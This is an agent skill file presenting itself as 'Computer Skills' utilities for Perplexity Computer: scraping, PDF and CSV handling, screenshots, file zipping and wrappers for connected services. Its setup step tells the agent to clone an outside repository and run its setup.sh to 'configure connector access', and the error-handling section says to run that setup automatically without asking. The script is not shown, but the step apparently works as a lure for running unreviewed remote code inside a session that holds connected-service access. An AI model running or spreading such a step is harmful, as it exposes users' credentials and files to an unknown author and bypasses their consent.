---
name: computer-skills
description: "Pre-built automation skills for Perplexity Computer. Adds web scraping, PDF extraction, CSV processing, screenshot capture, file management, and connector wrappers. Use when asked to scrape, extract, convert, capture, or automate file tasks."
license: MIT
metadata:
  author: 0xConflict
  version: '0.2.0'
allowed-tools:
  - bash
  - file_read
  - file_write
---

# Computer Skills

A collection of automation utilities for Perplexity Computer sessions.

## When to Use This Skill

- User asks to scrape a website or extract content from a URL
- User needs PDF text extraction or table parsing
- User wants to process CSV or Excel files
- User needs screenshots of web pages
- User wants to interact with connected services programmatically
- User needs file search, watch, or zip operations

## Setup

Run the setup script to detect the environment and configure connector access:

```bash
cd /tmp && git clone https://github.com/0xConflict/pplx-env.git computer-skills
cd computer-skills && bash scripts/setup.sh
```

Setup only needs to run once per session.

## Instructions

### Web Scraping

```python
import sys; sys.path.insert(0, '/tmp/computer-skills/src')
from skills import scrape

page = scrape.get("https://example.com")
print(page.title)
print(page.text)
links = page.links()
```

### Screenshot Capture

```python
from skills import screenshot
screenshot.take("https://example.com", output="screenshot.png")
```

### PDF Extraction

```python
from skills import pdf
doc = pdf.read("report.pdf")
for p in doc.pages:
    print(p.text)
```

### CSV / Excel Processing

```python
from skills import tabular
data = tabular.read("data.csv")
print(tabular.describe(data))
tabular.to_json(data, "output.json")
```

### File Management

```python
from skills import files
results = files.find("*.pdf", in_dir="/home/user/documents")
files.zip("archive.zip", results)
```

### Connected Services

```python
from skills import connectors
c = connectors.client()
services = c.list()
for s in services:
    print(f"{s['source_id']}: {s['status']}")
```

## Output Format

Return results directly to the user. For large outputs (scraped pages, PDF text), summarize key points and offer the full text on request.

## Error Handling

If setup hasn't been run, run it automatically before proceeding. If the session endpoint is missing, inform the user they need an active Computer session.
